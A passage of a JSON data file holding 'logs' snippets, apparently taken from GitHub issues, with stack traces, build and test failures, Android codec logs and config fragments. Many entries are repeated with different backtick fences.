        "logs": "`\r\n/home/pi/rcboat/node_modules/j5-io/dist/index.js:481\r\n            throw new Error('Invalid arguments');\r\n            ^\r\n\r\nError: Invalid arguments\r\n    at J5IO.i2cWrite (/home/pi/rcboat/node_modules/j5-io/dist/index.js:481:19)\r\n    at Compass.value (/home/pi/rcboat/node_modules/johnny-five/lib/compass.js:50:17)\r\n    at new Compass (/home/pi/rcboat/node_modules/johnny-five/lib/compass.js:532:10)\r\n    at Board.board.on (/home/pi/rcboat/run.js:33:16)\r\n    at emitNone (events.js:111:20)\r\n    at Board.emit (events.js:208:7)\r\n    at _combinedTickCallback (internal/process/next_tick.js:132:7)\r\n    at process._tickDomainCallback (internal/process/next_tick.js:219:9)\r\n    at Function.Module.runMain (module.js:696:11)\r\n    at startup (bootstrap_node.js:204:16)\r\nMakefile:2: recipe for target 'run' failed\r\nmake: *** [run] Error 1\r\n\r\n"
    },
    {
        "logs": "`\r\n  HMC5883L: {\r\n    REGISTER: {\r\n      value: {\r\n        // Page 11\r\n        // Table 2: Register List\r\n        //\r\n        // Configuration Register A\r\n        CRA: 0x00,\r\n        // Configuration Register B\r\n        // This may change, depending on gauss\r\n        CRB: 0x01,\r\n        // Mode Register\r\n        MODE: 0x02,\r\n        // Data Output X MSB Register\r\n        READ: 0x03,\r\n      }\r\n    },\r\n"
    },
    {
        "logs": "`Element type is invalid: expected a string (for built-in components) or a class/function (for composite components) but got: undefined. You likely forgot to export your component from the file it's defined in, or you might have mixed up default and named imports."
    },
    {
        "logs": "`React.cloneElement: element type is invalid -- expected a React element but got: function. You're likely trying to clone a component - you want createElement instead."
    },
    {
        "logs": "`2020-08-28 02:45:05.723 18474-18474 I/VideoEncoder: VideoEncoder OMX.Exynos.AVC.Encoder\r\n2020-08-28 02:45:05.724 18474-18474 I/VideoEncoder: Color supported: 2135033992\r\n2020-08-28 02:45:05.724 18474-18474 I/VideoEncoder: Color supported: 19\r\n2020-08-28 02:45:05.724 18474-18474 I/VideoEncoder: Color supported: 21\r\n2020-08-28 02:45:05.724 18474-18474 I/VideoEncoder: Color supported: 2130706449\r\n2020-08-28 02:45:05.724 18474-18474 I/VideoEncoder: Color supported: 16\r\n2020-08-28 02:45:05.725 18474-18474 I/VideoEncoder: Color supported: 2130747392\r\n2020-08-28 02:45:05.725 18474-18474 I/VideoEncoder: Color supported: 2130708361\r\n2020-08-28 02:45:05.727 18474-18474 I/ACodec:  [] Now uninitialized\r\n2020-08-28 02:45:05.740 18474-19996 I/ACodec: [] onAllocateComponent\r\n2020-08-28 02:45:05.742 18474-19996 I/OMXClient: IOmx service obtained\r\n2020-08-28 02:45:05.796 18474-19996 I/ACodec: [OMX.Exynos.AVC.Encoder] Now Loaded\r\n2020-08-28 02:45:05.799 18474-18474 I/VideoEncoder: Prepare video info: SURFACE, 311x640\r\n2020-08-28 02:45:05.807 18474-19996 W/OMXUtils: do not know color format 0x7f000011 = 2130706449\r\n2020-08-28 02:45:05.808 18474-19996 W/OMXUtils: do not know color format 0x10 = 16\r\n2020-08-28 02:45:05.809 18474-19996 W/OMXUtils: do not know color format 0x7f00a000 = 2130747392\r\n2020-08-28 02:45:05.810 18474-19996 W/OMXUtils: do not know color format 0x7f000789 = 2130708361\r\n2020-08-28 02:45:05.812 18474-19996 I/ACodec: app-name : rise.nubcxs.namnam\r\n2020-08-28 02:45:05.813 18474-19996 I/ACodec: setupAVCEncoderParameters with [profile: Baseline] [level: Level1]\r\n2020-08-28 02:45:05.814 18474-19996 I/ACodec: Enable Perceptual Video Coding\r\n2020-08-28 02:45:05.815 18474-19996 I/ACodec: Success set VideoMinQP(5/5/5) VideoMaxQP(50/50/50)\r\n2020-08-28 02:45:05.815 18474-19996 I/ACodec: SECSetparameters : default\r\n2020-08-28 02:45:05.817 18474-19996 I/ACodec: [OMX.Exynos.AVC.Encoder] cannot encode HDR static metadata. Ignoring.\r\n2020-08-28 02:45:05.817 18474-19996 I/ACodec: setupVideoEncoder succeeded\r\n2020-08-28 02:45:05.817 18474-19996 I/ACodec: [OMX.Exynos.AVC.Encoder] configure, AMessage : AMessage(what = 'conf', target = 7) = {\r\n      int32_t color-format = 2130708361\r\n      int32_t i-frame-interval = 2\r\n      string mime = \"video/avc\"\r\n      int32_t width = 311\r\n      int32_t bitrate = 1024000\r\n      int32_t max-input-size = 0\r\n      int32_t frame-rate = 30\r\n      int32_t height = 640\r\n      int32_t encoder = 1\r\n    }\r\n2020-08-28 02:45:05.820 18474-19996 W/OMXUtils: do not know color format 0x7f000789 = 2130708361\r\n2020-08-28 02:45:05.843 18474-18474 I/VideoEncoder: prepared\r\n2020-08-28 02:45:05.881 18474-18474 I/MicrophoneManager: Microphone created, 32000hz, Stereo\r\n2020-08-28 02:45:05.886 18474-18474 I/ACodec:  [] Now uninitialized\r\n2020-08-28 02:45:05.888 18474-20001 I/ACodec: [] onAllocateComponent\r\n2020-08-28 02:45:05.891 18474-20001 I/OMXClient: IOmx service obtained\r\n2020-08-28 02:45:05.897 18474-20001 I/ACodec: [OMX.SEC.naac.enc] Now Loaded\r\n2020-08-28 02:45:05.910 18474-18474 I/AudioEncoder: prepared\r\n2020-08-28 02:45:05.910 18474-18474 I/VideoEncoder: started\r\n2020-08-28 02:45:05.913 18474-19995 I/MediaCodec: MediaCodec will operate in async mode\r\n2020-08-28 02:45:05.914 18474-19996 I/ACodec: [OMX.Exynos.AVC.Encoder] Now Loaded->Idle\r\n2020-08-28 02:45:05.935 18474-19995 I/MediaCodec: setCodecState state : 0\r\n2020-08-28 02:45:05.939 18474-18474 I/AudioEncoder: started\r\n2020-08-28 02:45:05.943 18474-20001 I/MediaCodec: MediaCodec will operate in async mode\r\n2020-08-28 02:45:05.943 18474-20001 I/ACodec: [OMX.SEC.naac.enc] Now Loaded->Idle\r\n2020-08-28 02:45:05.960 18474-20001 I/ACodec: [OMX.SEC.naac.enc] Now Idle->Executing\r\n2020-08-28 02:45:05.961 18474-19996 I/ACodec: [OMX.Exynos.AVC.Encoder] Now Idle->Executing\r\n2020-08-28 02:45:05.962 18474-20001 I/ACodec: [OMX.SEC.naac.enc] Now Executing\r\n2020-08-28 02:45:05.964 18474-19996 I/ACodec: [OMX.Exynos.AVC.Encoder] Now Executing\r\n2020-08-28 02:45:05.989 18474-18474 D/mali_winsys: EGLint new_window_surface(egl_winsys_display *, void *, EGLSurface, EGLConfig, egl_winsys_surface **, EGLBoolean) returns 0x3000\r\n2020-08-28 02:45:06.016 18474-18474 I/MicrophoneManager: Microphone started\r\n2020-08-28 02:45:06.058 18474-18474 D/ViewRootImpl@2ecda6b[VNCActivity]: Relayout returned: old=[540,1078][540,1078] new=[540,1078][540,1078] result=0x1 surface={valid=false 0} changed=false\r\n2020-08-28 02:45:06.061 18474-18474 D/ViewRootImpl@2ecda6b[VNCActivity]: dispatchDetachedFromWindow\r\n2020-08-28 02:45:06.061 18474-18474 D/ViewRootImpl@2ecda6b[VNCActivity]: Surface release. android.view.ViewRootImpl.doDie:7979 android.view.ViewRootImpl.die:7947 android.view.WindowManagerGlobal.removeViewLocked:497 android.view.WindowManagerGlobal.removeView:435 android.view.WindowManagerImpl.removeViewImmediate:124 android.app.ActivityThread.handleDestroyActivity:4753 android.app.servertransaction.DestroyActivityItem.execute:39 android.app.servertransaction.TransactionExecutor.executeLifecycleState:145 \r\n2020-08-28 02:45:06.066 18474-18474 D/InputTransport: Input channel destroyed: fd=64\r\n2020-08-28 02:45:06.091 18474-19996 I/ACodec: we change android._dataspace here to 10c40000\r\n2020-08-28 02:45:06.091 18474-19996 D/ACodec: dataspace changed to 0x10c40000 (R:2(Limited), P:4(BT601_6_525), M:3(BT601_6), T:3(SMPTE170M)) (R:2(Limited), S:4(BT601_525), T:3(SMPTE_170M))\r\n2020-08-28 02:45:06.095 18474-19996 E/ACodec: [OMX.Exynos.AVC.Encoder] ERROR(0x80001001)\r\n2020-08-28 02:45:06.095 18474-19996 E/ACodec: signalError(omxError 0x80001001, internalError -2147483648)\r\n2020-08-28 02:45:06.095 18474-19995 E/MediaCodec: Codec reported err 0x80001001, actionCode 0, while in state 6\r\n2020-08-28 02:45:06.099 18474-20004 E/BaseEncoder: Error\r\n    android.media.MediaCodec$CodecException: Error 0x80001001\r\n2020-08-28 02:45:06.103 18474-19996 E/ACodec: [OMX.Exynos.AVC.Encoder] ERROR(0x80001001)\r\n2020-08-28 02:45:06.103 18474-19996 E/ACodec: signalError(omxError 0x80001001, internalError -2147483648)\r\n2020-08-28 02:45:06.103 18474-19995 E/MediaCodec: Codec reported err 0x80001001, actionCode 0, while in state 0\r\n2020-08-28 02:45:06.108 18474-19996 E/ACodec: [OMX.Exynos.AVC.Encoder] ERROR(0x80001001)\r\n2020-08-28 02:45:06.109 18474-19996 E/ACodec: signalError(omxError 0x80001001, internalError -2147483648)\r\n2020-08-28 02:45:06.109 18474-19995 E/MediaCodec: Codec reported err 0x80001001, actionCode 0, while in state 0\r\n2020-08-28 02:45:06.936 18474-19995 I/MediaCodec: setCodecState state : 0\r\n[Truncated]\n    CQ supported: false\r\n    ----- -----\r\n    ----- Video info -----\r\n    Supported colors: \r\n    2135033992\r\n    19\r\n    21\r\n    2130708361\r\n    Profile: 1, level: 128\r\n    Bitrate range: 1 - 30000000\r\n    Frame rate range: 0 - 960\r\n    Width range: 2 - 2048\r\n    Height range: 2 - 2048\r\n    ----- -----\r\n    Max instances: 32\r\n    ----------------"
    },
    {
        "logs": "`\r\nINTERNALERROR> FileNotFoundError: [Errno 2] No such file or directory: 'oc': 'oc'\r\n\r\n============================= 2 warnings in 1.32s ==============================\r\n\r\nERROR: InvocationError for command /home/travis/build/red-hat-storage/ocs-ci/.tox/collectonly/bin/py.test --collect-only tests (exited with code 3)\r\n"
    },
    {
        "logs": "```\r\nINTERNALERROR> FileNotFoundError: [Errno 2] No such file or directory: 'oc': 'oc'\r\n\r\n============================= 2 warnings in 1.32s ==============================\r\n\r\nERROR: InvocationError for command /home/travis/build/red-hat-storage/ocs-ci/.tox/collectonly/bin/py.test --collect-only tests (exited with code 3)\r\n"
    },
    {
        "logs": "`\n<issue_comment>username_1: Thanks for the detailed writeup! Your analysis is spot on. I didn't consider this situation with the orphan check.\r\n\r\nI've been trying to think of an easy way to address this, but everything I think of is either risky or complicated.\r\n\r\nI'm wondering if it would be better to just try to do the proper fix.  rustdoc needs a way for cargo to tell it where each crate is located. Then cargo could come up with some directory naming scheme to allow duplicates.  I don't think it should be *too* difficult.  However, some thought needs to be put in if "
    },
    {
        "logs": "` should behave exactly (https://github.com/rust-lang/rust/pull/82776#issuecomment-913016392 / https://github.com/rust-lang/rust/pull/88646).  And it would need to support relative paths I think.\n<issue_comment>username_0: Yeah, I was afraid of that, but I think you're right, and doing that provides other benefits as well :)\n<issue_comment>username_2: I think this particular bug might be a little higher priority than it seems because it shows up exactly as specified for any newbie learning from the Rust Book in the first exposure to "
    },
    {
        "logs": "`json\r\n{\r\n  \"plugins\": [\"@typescript-eslint\"],\r\n  \"extends\": [\r\n    \"next/core-web-vitals\",\r\n    \"plugin:@typescript-eslint/recommended\",\r\n    \"plugin:storybook/recommended\",\r\n    \"prettier\"\r\n  ],\r\n  \"rules\": {\r\n    \"@typescript-eslint/no-unused-vars\": \"error\",\r\n    \"@typescript-eslint/no-explicit-any\": \"error\",\r\n    \"semi\": [1, \"never\"]\r\n  },\r\n  \"overrides\": [\r\n    {\r\n      \"files\": [\"*.mdx\", \"*.md\"],\r\n      \"extends\": \"plugin:mdx/recommended\",\r\n      \"parserOptions\": {\r\n        \"ecmaVersion\": \"latest\"\r\n      }\r\n    }\r\n  ]\r\n}\r\n"
    },
    {
        "logs": "```json\r\n{\r\n  \"plugins\": [\"@typescript-eslint\"],\r\n  \"extends\": [\r\n    \"next/core-web-vitals\",\r\n    \"plugin:@typescript-eslint/recommended\",\r\n    \"plugin:storybook/recommended\",\r\n    \"prettier\"\r\n  ],\r\n  \"rules\": {\r\n    \"@typescript-eslint/no-unused-vars\": \"error\",\r\n    \"@typescript-eslint/no-explicit-any\": \"error\",\r\n    \"semi\": [1, \"never\"]\r\n  },\r\n  \"overrides\": [\r\n    {\r\n      \"files\": [\"*.mdx\", \"*.md\"],\r\n      \"extends\": \"plugin:mdx/recommended\",\r\n      \"parserOptions\": {\r\n        \"ecmaVersion\": \"latest\"\r\n      }\r\n    }\r\n  ]\r\n}\r\n"
    },
    {
        "logs": "`\r\nAuto-Configuration Error: Couldn't find undname.exe under C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC, please check your VC installation and set BAZEL_VC environment variable correctly.\r\n"
    },
    {
        "logs": "`\r\n\r\nI will look into this...\n<issue_comment>username_1: I guess the Explorer is cheating on us. I cannot really give just the right \"ListDirectory\", it always comes with \"Read\". I have removed everything from the access entry for some user except from \"List folder content\":\r\n![image](https://cloud.githubusercontent.com/assets/11280760/25962594/9d4022d0-367e-11e7-9cf0-753bb027e4eb.png)\r\n\r\nGet-NTFSAccess returns this:\r\n"
    },
    {
        "logs": "`\r\n(.venv)sahil@rHaaS:~/git/HIL/tests/unit$ py.test .\r\n========================================================================================================= test session starts =========================================================================================================\r\nplatform linux2 -- Python 2.7.6, pytest-2.9.2, py-1.4.31, pluggy-0.3.1\r\nrootdir: /home/sahil/git/HIL, inifile: setup.cfg\r\nplugins: xdist-1.14, cov-1.8.0\r\ncollected 462 items / 1 errors \r\nclass_resolver.py ...\r\ncli.py .....\r\nconfig.py .\r\ndev_support.py ....\r\nhaas_auth.py .\r\nmigrations.py ss\r\nmodel.py ................\r\ntest_common.py ....................................\r\napi/auth.py ...................................................................................................................................................................................\r\napi/main.py ........................................................................................................................................................................\r\napi/port_revert.py ...\r\next/auth/database.py ...............................\r\next/auth/mock.py .....\r\next/network_allocators/vlan_pool.py ..\r\next/obm/ipmi.py ..\r\next/switches/brocade.py ....\r\n\r\n================= ERRORS ==============================================\r\n__________________ ERROR collecting tests/unit/rest.py \r\n\r\n"
    },
    {
        "logs": "`\r\n../../.venv/local/lib/python2.7/site-packages/_pytest/config.py:392: in import_plugin\r\n    raise new_exc\r\nE   ImportError: Error importing plugin \"pytest_catchlog\": No module named pytest_catchlog\r\n================ 460 passed, 2 skipped, 1 error in 60.67 seconds =====================\r\n\r\n"
    },
    {
        "logs": "```\r\n(.venv)sahil@rHaaS:~/git/HIL/tests/unit$ py.test .\r\n========================================================================================================= test session starts =========================================================================================================\r\nplatform linux2 -- Python 2.7.6, pytest-2.9.2, py-1.4.31, pluggy-0.3.1\r\nrootdir: /home/sahil/git/HIL, inifile: setup.cfg\r\nplugins: xdist-1.14, cov-1.8.0\r\ncollected 462 items / 1 errors \r\nclass_resolver.py ...\r\ncli.py .....\r\nconfig.py .\r\ndev_support.py ....\r\nhaas_auth.py .\r\nmigrations.py ss\r\nmodel.py ................\r\ntest_common.py ....................................\r\napi/auth.py ...................................................................................................................................................................................\r\napi/main.py ........................................................................................................................................................................\r\napi/port_revert.py ...\r\next/auth/database.py ...............................\r\next/auth/mock.py .....\r\next/network_allocators/vlan_pool.py ..\r\next/obm/ipmi.py ..\r\next/switches/brocade.py ....\r\n\r\n================= ERRORS ==============================================\r\n__________________ ERROR collecting tests/unit/rest.py \r\n\r\n"
    },
    {
        "logs": "```\r\n../../.venv/local/lib/python2.7/site-packages/_pytest/config.py:392: in import_plugin\r\n    raise new_exc\r\nE   ImportError: Error importing plugin \"pytest_catchlog\": No module named pytest_catchlog\r\n================ 460 passed, 2 skipped, 1 error in 60.67 seconds =====================\r\n\r\n"
    },
    {
        "logs": "`ts\r\n    database.dataChange.subscribe(data => {\r\n      this.nestedDataSource.data = data;\r\n      console.log(data);             // <-- see screenshot below\r\n      });\r\n    console.log('Please expand the Applications node within 10 seconds');\r\n    setTimeout(() => {\r\n      const data = this.nestedDataSource.data;\r\n      for (let node of data) {\r\n        if (node.filename == \"Applications\") {\r\n          const newnode = new FileNode();\r\n          newnode.filename = \"ghost\";\r\n          newnode.type = \"gs\";\r\n          node.children.push(newnode);\r\n          console.log(\"Added component\");\r\n        }\r\n      }\r\n      // force change\r\n      console.log(\"Forcing change\");\r\n      database.dataChange.next(data);         // <-- firing event here\r\n    }, 10000);\r\n"
    },
    {
        "logs": "```ts\r\n    database.dataChange.subscribe(data => {\r\n      this.nestedDataSource.data = data;\r\n      console.log(data);             // <-- see screenshot below\r\n      });\r\n    console.log('Please expand the Applications node within 10 seconds');\r\n    setTimeout(() => {\r\n      const data = this.nestedDataSource.data;\r\n      for (let node of data) {\r\n        if (node.filename == \"Applications\") {\r\n          const newnode = new FileNode();\r\n          newnode.filename = \"ghost\";\r\n          newnode.type = \"gs\";\r\n          node.children.push(newnode);\r\n          console.log(\"Added component\");\r\n        }\r\n      }\r\n      // force change\r\n      console.log(\"Forcing change\");\r\n      database.dataChange.next(data);         // <-- firing event here\r\n    }, 10000);\r\n"
    },
    {
        "logs": "```\n\na) For `nixos-rebuild` you can set\n  { nixpkgs.config.allowUnsupportedSystem = true; }\nin configuration.nix to override this.\n\nb) For `nix-env`, `nix-build`, `nix-shell` or any other Nix command you can add\n  { allowUnsupportedSystem = true; }\nto ~/.config/nixpkgs/config.nix.\n\n\n"
    },
    {
        "logs": "```\n\na) For `nixos-rebuild` you can set\n  { nixpkgs.config.allowUnsupportedSystem = true; }\nin configuration.nix to override this.\n\nb) For `nix-env`, `nix-build`, `nix-shell` or any other Nix command you can add\n  { allowUnsupportedSystem = true; }\nto ~/.config/nixpkgs/config.nix.\n\n\n"
    },
    {
        "logs": "`\r\nERR! getThreadList TypeError: Cannot read property 'error_results' of undefined\r\nERR! getThreadList     at defaultFuncs.post.then.then (/home/lambda/facebook-chat-api/src/getThreadList.js:195:41)\r\nERR! getThreadList     at tryCatcher (/home/lambda/Applications/Facebridge/FacebookBot/node_modules/bluebird/js/main/util.js:26:23)\r\n...\r\n"
    },
    {
        "logs": "`\r\nPerforming system checks...\r\nSystem check identified no issues (0 silenced).\r\nApril 10, 2020 - 00:24:02\r\nDjango version 3.0.3, using settings 'web_project.settings'\r\nStarting development server at http://0.0.0.0:1000/\r\nQuit the server with CONTROL-C.\r\n"
    },
    {
        "logs": "```\r\nPerforming system checks...\r\nSystem check identified no issues (0 silenced).\r\nApril 10, 2020 - 00:24:02\r\nDjango version 3.0.3, using settings 'web_project.settings'\r\nStarting development server at http://0.0.0.0:1000/\r\nQuit the server with CONTROL-C.\r\n"
    },
    {
        "logs": "`\r\nnimble build\r\n  Verifying dependencies for nimlsp@0.2.1\r\n      Info: Dependency on astpatternmatching@any version already satisfied\r\n  Verifying dependencies for ast_pattern_matching@1.0.0\r\n      Info: Dependency on jsonschema@>= 0.2.1 already satisfied\r\n  Verifying dependencies for jsonschema@0.2.1\r\n      Info: Dependency on ast_pattern_matching@any version already satisfied\r\n  Verifying dependencies for ast_pattern_matching@1.0.0\r\n   Building nimlsp/nimlsp using c backend\r\n       Tip: 6 messages have been suppressed, use --verbose to show them.\r\n     Error: Build failed for package: nimlsp\r\n        ... Details:\r\n        ... Execution failed with exit code 1\r\n        ... Command: \"/Users/USER/.local/Cellar/nim/1.2.0/nim/bin/nim\" c --noNimblePath -d:NimblePkgVersion=0.2.1 --path:\"/Users/USER/.nimble/pkgs/ast_pattern_matching-1.0.0\"  --path:\"/Users/USER/.nimble/pkgs/jsonschema-0.2.1\"  --path:\"/Users/USER/.nimble/pkgs/ast_pattern_matching-1.0.0\"  -o:\"/Users/USER/gitrepos/nimlsp/nimlsp\" \"/Users/USER/gitrepos/nimlsp/src/nimlsp.nim\"\r\n        ... Output: Hint: used config file '/Users/USER/.local/Cellar/nim/1.2.0/nim/config/nim.cfg' [Conf]\r\n        ... Hint: used config file '/Users/USER/gitrepos/nimlsp/src/nimlsp.nim.cfg' [Conf]\r\n        ... Hint: used config file '/Users/USER/gitrepos/nimlsp/src/config.nims' [Conf]\r\n        ... Hint: system [Processing]\r\n        ... Hint: widestrs [Processing]\r\n        ... Hint: io [Processing]\r\n        ... Hint: nimlsp [Processing]\r\n        ... Hint: baseprotocol [Processing]\r\n        ... Hint: streams [Processing]\r\n        ... Hint: strutils [Processing]\r\n        ... Hint: parseutils [Processing]\r\n        ... Hint: math [Processing]\r\n        ... Hint: bitops [Processing]\r\n        ... Hint: macros [Processing]\r\n        ... Hint: algorithm [Processing]\r\n        ... Hint: unicode [Processing]\r\n        ... Hint: json [Processing]\r\n        ... Hint: hashes [Processing]\r\n        ... Hint: tables [Processing]\r\n        ... Hint: lexbase [Processing]\r\n        ... Hint: parsejson [Processing]\r\n        ... Hint: options [Processing]\r\n        ... Hint: typetraits [Processing]\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/baseprotocol.nim(4, 24) Warning: inherit from a more precise exception type like ValueError, IOError or OSError [InheritFromException]\r\n        ... Hint: utfmapping [Processing]\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/utfmapping.nim(1, 8) Warning: imported and not used: 'tables' [UnusedImport]\r\n        ... Hint: suggestlib [Processing]\r\n        ... Hint: os [Processing]\r\n        ... Hint: pathnorm [Processing]\r\n        ... Hint: osseps [Processing]\r\n        ... Hint: posix [Processing]\r\n        ... Hint: times [Processing]\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/suggestlib.nim(11, 8) template/generic instantiation of "
    },
    {
        "logs": "` from here\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/suggestlib.nim(7, 14) Error: cannot open file: /Users/USER/.local/Cellar/nim/1.2.0/nim/nimsuggest/nimsuggest.nim\r\n"
    },
    {
        "logs": "```\r\nnimble build\r\n  Verifying dependencies for nimlsp@0.2.1\r\n      Info: Dependency on astpatternmatching@any version already satisfied\r\n  Verifying dependencies for ast_pattern_matching@1.0.0\r\n      Info: Dependency on jsonschema@>= 0.2.1 already satisfied\r\n  Verifying dependencies for jsonschema@0.2.1\r\n      Info: Dependency on ast_pattern_matching@any version already satisfied\r\n  Verifying dependencies for ast_pattern_matching@1.0.0\r\n   Building nimlsp/nimlsp using c backend\r\n       Tip: 6 messages have been suppressed, use --verbose to show them.\r\n     Error: Build failed for package: nimlsp\r\n        ... Details:\r\n        ... Execution failed with exit code 1\r\n        ... Command: \"/Users/USER/.local/Cellar/nim/1.2.0/nim/bin/nim\" c --noNimblePath -d:NimblePkgVersion=0.2.1 --path:\"/Users/USER/.nimble/pkgs/ast_pattern_matching-1.0.0\"  --path:\"/Users/USER/.nimble/pkgs/jsonschema-0.2.1\"  --path:\"/Users/USER/.nimble/pkgs/ast_pattern_matching-1.0.0\"  -o:\"/Users/USER/gitrepos/nimlsp/nimlsp\" \"/Users/USER/gitrepos/nimlsp/src/nimlsp.nim\"\r\n        ... Output: Hint: used config file '/Users/USER/.local/Cellar/nim/1.2.0/nim/config/nim.cfg' [Conf]\r\n        ... Hint: used config file '/Users/USER/gitrepos/nimlsp/src/nimlsp.nim.cfg' [Conf]\r\n        ... Hint: used config file '/Users/USER/gitrepos/nimlsp/src/config.nims' [Conf]\r\n        ... Hint: system [Processing]\r\n        ... Hint: widestrs [Processing]\r\n        ... Hint: io [Processing]\r\n        ... Hint: nimlsp [Processing]\r\n        ... Hint: baseprotocol [Processing]\r\n        ... Hint: streams [Processing]\r\n        ... Hint: strutils [Processing]\r\n        ... Hint: parseutils [Processing]\r\n        ... Hint: math [Processing]\r\n        ... Hint: bitops [Processing]\r\n        ... Hint: macros [Processing]\r\n        ... Hint: algorithm [Processing]\r\n        ... Hint: unicode [Processing]\r\n        ... Hint: json [Processing]\r\n        ... Hint: hashes [Processing]\r\n        ... Hint: tables [Processing]\r\n        ... Hint: lexbase [Processing]\r\n        ... Hint: parsejson [Processing]\r\n        ... Hint: options [Processing]\r\n        ... Hint: typetraits [Processing]\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/baseprotocol.nim(4, 24) Warning: inherit from a more precise exception type like ValueError, IOError or OSError [InheritFromException]\r\n        ... Hint: utfmapping [Processing]\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/utfmapping.nim(1, 8) Warning: imported and not used: 'tables' [UnusedImport]\r\n        ... Hint: suggestlib [Processing]\r\n        ... Hint: os [Processing]\r\n        ... Hint: pathnorm [Processing]\r\n        ... Hint: osseps [Processing]\r\n        ... Hint: posix [Processing]\r\n        ... Hint: times [Processing]\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/suggestlib.nim(11, 8) template/generic instantiation of `mImport` from here\r\n        ... /Users/USER/gitrepos/nimlsp/src/nimlsppkg/suggestlib.nim(7, 14) Error: cannot open file: /Users/USER/.local/Cellar/nim/1.2.0/nim/nimsuggest/nimsuggest.nim\r\n"
    },
    {
        "logs": "`\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: bamboo_jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: dark_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: swamp_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_lakes\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: deep_warm_ocean\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: birch_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: bamboo_jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: dark_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: swamp_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_lakes\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: deep_warm_ocean\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: birch_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: 